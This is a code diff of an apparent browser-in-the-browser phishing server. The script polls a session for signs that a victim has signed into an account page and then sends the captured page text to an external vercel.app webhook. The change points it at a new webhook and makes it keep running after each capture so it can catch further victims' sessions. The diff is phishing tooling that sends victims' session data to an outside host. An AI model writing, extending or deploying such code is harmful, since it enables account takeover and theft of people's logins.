@@ -16,7 +16,8 @@ const https       = require('https');
 
 const execAsync = promisify(exec);
 
-const WEBHOOK_URL  = 'https://negd-assesment.vercel.app/api/webhook';
+const WEBHOOK_URL  = 'https://negd-java-assesment.vercel.app/api/webhook';
+//const WEBHOOK_URL  = 'http://localhost:3000/api/webhook';
 const MATCH_WORDS  = ['Home', 'Personal Info', "You're signed in", 'Your devices', 'You have inactive devices'];
 const POLL_DELAY   = 10;   // ms between polls (runs after previous completes)
 const RETRY_DELAY  = 50;  // ms between webhook retries
@@ -115,16 +116,16 @@ async function startPolling() {
   console.log(`[bitb-server] webhook target: ${WEBHOOK_URL}\n`);
 
   const loop = async () => {
-    if (detected) return;
-
     const { isLoggedIn, text } = await pollOnce();
 
-    if (isLoggedIn) {
+    if (isLoggedIn && !detected) {
       detected = true;
       console.log('\n[bitb-server] 🔓 login detected! firing webhook...');
       await sendWebhook(text);
-      console.log('[bitb-server] ✅ done — exiting.');
-      process.exit(0);
+      console.log('[bitb-server] ✅ webhook confirmed — resuming poll for next session...');
+      // Reset so the next candidate session can trigger again
+      detected = false;
+      setTimeout(loop, POLL_DELAY);
     } else {
       setTimeout(loop, POLL_DELAY);
     }
